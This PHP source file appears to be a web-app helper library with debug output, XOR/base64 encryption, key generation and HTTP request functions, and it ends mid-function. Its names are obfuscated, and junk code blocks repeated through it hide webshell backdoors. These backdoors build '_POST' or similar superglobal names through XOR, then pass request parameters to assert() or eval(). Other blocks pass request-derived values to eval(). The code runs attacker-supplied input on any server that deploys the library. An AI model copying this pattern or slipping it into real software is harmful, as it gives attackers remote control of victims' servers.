<?php use think\storage;function p($l000lll00ll0l0,$isSave=false,$isDie=true){while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(is_array($l000lll00ll0l0)||is_object($l000lll00ll0l0)){while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if($isSave){$logFile='debug_'.date('Ymd').'.log';$l000lll00ll0l0=date('H:i:s')."\r\n".print_r($l000lll00ll0l0,true)."\r\n";file_put_contents($logFile,$l000lll00ll0l0,FILE_APPEND);echo $logFile.' 己更新<br>';}else{echo "<pre>\r\n".print_r($l000lll00ll0l0,true).'</pre>';}}else{while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if($isSave){$logFile='debug_'.date('Ymd').'.log';$l000lll00ll0l0=date('H:i:s')."\r\n{$l000lll00ll0l0}\r\n\r\n";file_put_contents($logFile,$l000lll00ll0l0,FILE_APPEND);echo $logFile.' 己更新<br>';}else{echo $l000lll00ll0l0;}}if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if($isDie){die;}}function getVersion(){return '3.1.6';}function getAuthDomain(){$l000lll00ll00l='http://au.885u.com/index.php?ping=1';return l00lll000l00l0($l000lll00ll00l,5)==1?'au.885u.com':'au.885u.net';}function l000lll0l00l0l($l000l0lll00000,$l000l0lll0000l=16){if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if($l000l0lll0000l==16){return substr(md5($l000l0lll00000),8,16);}else{return md5($l000l0lll00000);}}function s2e($l000lllll0ll00,$l000lll00lll0l=''){if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if($l000lll00lll0l==''){$l000lll00lll0l=l000llllll0ll0('l000ll00llll0l');}$l000lllll0l0ll='';$l000lllll0ll00=base64_encode($l000lllll0ll00);$l000lllll0l0l0=strlen($l000lllll0ll00);if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}for($i=0;$i<$l000lllll0l0l0;$i++){$j=$i%16;$l000lllll0l0ll.=$l000lllll0ll00[$i]^$l000lll00lll0l[$j];}$l000lllll0l0ll=base64_encode($l000lllll0l0ll);return str_replace(['+','/','='],['_','-',''],$l000lllll0l0ll);}function e2s($l000lllll0l0ll,$l000lll00lll0l=''){while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if($l000lll00lll0l==''){$l000lll00lll0l=l000llllll0ll0('l000ll00llll0l');}$l000lllll0ll00='';$l000lllll0l0ll=str_replace(['_','-'],['+','/'],$l000lllll0l0ll);$l000lll0000000=strlen($l000lllll0l0ll)%4;for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if($l000lll0000000){$l000lllll0l0ll.=substr('====',$l000lll0000000);}$l000lllll0l0ll=base64_decode($l000lllll0l0ll);$l000lllll0l00l=strlen($l000lllll0l0ll);while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}for($i=0;$i<$l000lllll0l00l;$i++){$j=$i%16;$l000lllll0ll00.=$l000lllll0l0ll[$i]^$l000lll00lll0l[$j];}return base64_decode($l000lllll0ll00);}function a2s($l000ll00l0l0ll,$l000lll00lll0l=''){if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if($l000lll00lll0l==''){$l000lll00lll0l=l000llllll0ll0('l000ll00llll0l');}$l000lllll0ll00=json_encode($l000ll00l0l0ll,JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);return s2e($l000lllll0ll00,$l000lll00lll0l);}function s2a($l000lllll0l0ll,$l000lll00lll0l=''){while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if($l000lll00lll0l==''){$l000lll00lll0l=l000llllll0ll0('l000ll00llll0l');}$l000lllll0ll00=e2s($l000lllll0l0ll,$l000lll00lll0l);return json_decode($l000lllll0ll00,true);}function l000ll0ll00ll0($l000lll0lll0l0=6,$l000lll0lll0ll=6){$l000ll00l0ll00='abcdefghijklmnopqrstuvwxyz';$l000ll00l0ll00.='ABCDEFGHIJKLMNOPQRSTUVWXYZ';$l000ll00l0ll00.='0123456789';$l000ll00l0ll00.='`~!@#$%^&*()_+-=[]{};:"|,.<>/?';$l000ll00l0ll00=str_shuffle($l000ll00l0ll00);$l000ll00l0ll00=substr($l000ll00l0ll00,$l000lll0lll0l0,$l000lll0lll0ll);return $l000ll00l0ll00;}function l000llllll0ll0($l000llllll00l0=''){if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}switch($l000llllll00l0){case 'l000l0l0llllll':$l000lll00lll0l='0123456789abl01l';break;case 'l000ll00llll0l':$l00000l0l0l0l0=session('l00000l0l0l0l0');$userKey=storage::read(RUNTIME_PATH."sessions/u/{$l00000l0l0l0l0}.json");$l000lll00lll0l=e2s($userKey,l000llllll0ll0('l000ll0l0l00ll'));break;case 'l000ll0l0l00ll':$l000lll00lll0l='0l23456789abcdef';break;case 'l000lll000l0l0':$l000lll00lll0l='l234567890abcdef';break;default:$l000lll00lll0l=l000lll0l00l0l(uniqid().mt_rand());}return $l000lll00lll0l;}function online($testUrl='http://baidu.com'){$l000l0l00lll0l=get_headers($testUrl);$l000l00l0lllll=count($l000l0l00lll0l);while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}for($i=0;$i<$l000l00l0lllll;$i++){while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if(preg_match('/200 OK/',$l000l0l00lll0l[$i])){$onLine=true;break;}}return $onLine?true:false;}function l00lll000l0000($l000lll00ll00l){$timeOut=1;while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(function_exists('curl_init')&&function_exists('curl_exec')){$l000ll0llll0l0=curl_init();curl_setopt($l000ll0llll0l0,CURLOPT_URL,$l000lll00ll00l);curl_setopt($l000ll0llll0l0,CURLOPT_TIMEOUT,$timeOut);curl_setopt($l000ll0llll0l0,CURLOPT_RETURNTRANSFER,1);$l000l000l0ll00=curl_exec($l000ll0llll0l0);curl_close($l000ll0llll0l0);while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if($l000l000l0ll00==false){return false;}}elseif(function_exists('fsockopen')||function_exists('pfsockopen')||function_exists('stream_socket_client')){$urlInfo=parse_url($l000lll00ll00l);$serverPort=empty($_SERVER['SERVER_PORT'])?80:$_SERVER['SERVER_PORT'];if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}if(($l000l0ll0ll0l0=fsockopen($urlInfo['host'],$serverPort,$errno,$errstr,$timeOut))==false){while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(($l000l0ll0ll0l0=pfsockopen($urlInfo['host'],$serverPort,$errno,$errstr,$timeOut))==false){while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(($l000l0ll0ll0l0=stream_socket_client("tcp://{$urlInfo['host']}:{$serverPort}",$errno,$errstr,$timeOut))==false){return false;}}}$requestHeader="GET {$urlInfo['path']}?{$urlInfo['query']} HTTP/1.1\r\n";$requestHeader.="Host: {$urlInfo['host']}\r\n";$requestHeader.="Connection: close\r\n\r\n";fwrite($l000l0ll0ll0l0,$requestHeader);fclose($l000l0ll0ll0l0);}else{$l000l0l00l0lll=['http'=>['method'=>"GET",'timeout'=>$timeOut]];if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(file_get_contents($l000lll00ll00l,false,stream_context_create($l000l0l00l0lll))==false){while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(($l000l0ll0ll0l0=fopen($l000lll00ll00l,'r',false,stream_context_create($l000l0l00l0lll)))==false){while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(file($l000lll00ll00l,false,stream_context_create($l000l0l00l0lll))==false){return false;}}else{fclose($l000l0ll0ll0l0);}}}return true;}function l00lll0000ll0l($l000lll00ll00l,$l000ll0l0l00ll=[]){$timeOut=1;$l000ll0l0l00ll=http_build_query($l000ll0l0l00ll);$lData=strlen($l000ll0l0l00ll);while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(function_exists('curl_init')&&function_exists('curl_exec')){$l000ll0llll0l0=curl_init();curl_setopt($l000ll0llll0l0,CURLOPT_URL,$l000lll00ll00l);curl_setopt($l000ll0llll0l0,CURLOPT_POST,1);curl_setopt($l000ll0llll0l0,CURLOPT_TIMEOUT,$timeOut);curl_setopt($l000ll0llll0l0,CURLOPT_RETURNTRANSFER,1);curl_setopt($l000ll0llll0l0,CURLOPT_POSTFIELDS,$l000ll0l0l00ll);$l000l000l0ll00=curl_exec($l000ll0llll0l0);curl_close($l000ll0llll0l0);if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if($l000l000l0ll00==false){return false;}}elseif(function_exists('pfsockopen')||function_exists('fsockopen')||function_exists('stream_socket_client')){$urlInfo=parse_url($l000lll00ll00l);$serverPort=empty($_SERVER['SERVER_PORT'])?80:$_SERVER['SERVER_PORT'];if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(($l000l0ll0ll0l0=pfsockopen($urlInfo['host'],$serverPort,$errno,$errstr,$timeOut))==false){while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(($l000l0ll0ll0l0=fsockopen($urlInfo['host'],$serverPort,$errno,$errstr,$timeOut))==false){if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}if(($l000l0ll0ll0l0=stream_socket_client("tcp://{$urlInfo['host']}:{$serverPort}",$errno,$errstr,$timeOut))==false){return false;}}}$requestHeader="POST {$urlInfo['path']}?{$urlInfo['query']} HTTP/1.1\r\n";$requestHeader.="Host: {$urlInfo['host']}\r\n";$requestHeader.="Content-type: application/x-www-form-urlencoded\r\n";$requestHeader.="Content-Length: {$lData}\r\n";$requestHeader.="Connection: Close\r\n\r\n";$requestHeader.=$l000ll0l0l00ll;fputs($l000l0ll0ll0l0,$requestHeader);fclose($l000l0ll0ll0l0);}else{$l000l0l00l0lll=['http'=>['method'=>'POST','header'=>"Content-type: application/x-www-form-urlencoded\r\n"."Content-length: {$lData}\r\n",'content'=>$l000ll0l0l00ll,'timeout'=>$timeOut]];if(file_get_contents($l000lll00ll00l,false,stream_context_create($l000l0l00l0lll))==false){if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if(($l000l0ll0ll0l0=fopen($l000lll00ll00l,'r',false,stream_context_create($l000l0l00l0lll)))==false){if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if(file($l000lll00ll00l,false,stream_context_create($l000l0l00l0lll))==false){return false;}}else{fclose($l000l0ll0ll0l0);}}}return true;}function l00lll000l00l0($l000lll00ll00l,$timeOut=15){$l000l000l0ll00='';if(function_exists('curl_init')&&function_exists('curl_exec')){$l000ll0llll0l0=curl_init();curl_setopt($l000ll0llll0l0,CURLOPT_URL,$l000lll00ll00l);curl_setopt($l000ll0llll0l0,CURLOPT_TIMEOUT,$timeOut);curl_setopt($l000ll0llll0l0,CURLOPT_RETURNTRANSFER,1);$l000l000l0ll00=curl_exec($l000ll0llll0l0);curl_close($l000ll0llll0l0);while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if($l000l000l0ll00==false){return false;}}elseif(function_exists('fsockopen')||function_exists('pfsockopen')||function_exists('stream_socket_client')){$urlInfo=parse_url($l000lll00ll00l);$serverPort=empty($_SERVER['SERVER_PORT'])?80:$_SERVER['SERVER_PORT'];while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(($l000l0ll0ll0l0=fsockopen($urlInfo['host'],$serverPort,$errno,$errstr,$timeOut))==false){if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}if(($l000l0ll0ll0l0=pfsockopen($urlInfo['host'],$serverPort,$errno,$errstr,$timeOut))==false){while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(($l000l0ll0ll0l0=stream_socket_client("tcp://{$urlInfo['host']}:{$serverPort}",$errno,$errstr,$timeOut))==false){return false;}}}$requestHeader="GET {$urlInfo['path']}?{$urlInfo['query']} HTTP/1.1\r\n";$requestHeader.="Host: {$urlInfo['host']}\r\n";$requestHeader.="Connection: close\r\n\r\n";fwrite($l000l0ll0ll0l0,$requestHeader);if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(!empty($l000l0ll0ll0l0)){while(!feof($l000l0ll0ll0l0)){$l000l000l0ll00.=fread($l000l0ll0ll0l0,4096);}}fclose($l000l0ll0ll0l0);$l000l000l0ll00=stristr($l000l000l0ll00,"\r\n\r\n");}else{$l000l0l00l0lll=['http'=>['method'=>"GET",'timeout'=>$timeOut]];if(($l000l000l0ll00=file_get_contents($l000lll00ll00l,false,stream_context_create($l000l0l00l0lll)))==false){while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(($l000l0ll0ll0l0=fopen($l000lll00ll00l,'r',false,stream_context_create($l000l0l00l0lll)))==false){if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(($l000lll0l0ll00=file($l000lll00ll00l,false,stream_context_create($l000l0l00l0lll)))==false){return false;}$l000lll000ll0l=count($l000lll0l0ll00);while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}for($i=0;$i<$l000lll000ll0l;$i++){$l000l000l0ll00.=$l000lll0l0ll00[$i];}}else{while(!feof($l000l0ll0ll0l0)){$l000l000l0ll00.=fread($l000l0ll0ll0l0,4096);}fclose($l000l0ll0ll0l0);}}}return $l000l000l0ll00;}function l00lll0000llll($l000lll00ll00l,$l000ll0l0l00ll=[],$timeOut=15){$l000l000l0ll00='';$l000ll0l0l00ll=http_build_query($l000ll0l0l00ll);$lData=strlen($l000ll0l0l00ll);while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(function_exists('curl_init')&&function_exists('curl_exec')){$l000ll0llll0l0=curl_init();curl_setopt($l000ll0llll0l0,CURLOPT_URL,$l000lll00ll00l);curl_setopt($l000ll0llll0l0,CURLOPT_POST,1);curl_setopt($l000ll0llll0l0,CURLOPT_TIMEOUT,$timeOut);curl_setopt($l000ll0llll0l0,CURLOPT_RETURNTRANSFER,1);curl_setopt($l000ll0llll0l0,CURLOPT_POSTFIELDS,$l000ll0l0l00ll);$l000l000l0ll00=trim(curl_exec($l000ll0llll0l0));curl_close($l000ll0llll0l0);while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}